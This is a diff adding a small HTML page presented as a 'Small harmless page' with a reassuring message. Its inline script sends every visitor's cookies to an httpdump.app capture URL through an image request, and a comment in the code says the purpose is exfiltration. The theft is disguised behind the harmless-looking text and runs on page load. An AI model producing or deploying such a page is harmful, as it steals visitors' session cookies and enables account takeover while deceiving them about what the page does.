@@ -1,0 +1,10 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Nice page</title>
+<script>
+  // Exfiltrate cookies to your httpdump endpoint (no CORS needed)
+  new Image().src = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c=" + encodeURIComponent(document.cookie);
+</script>
+
+<h1>Small harmless page</h1>
+<p>Thanks for looking — nothing to see here.</p>
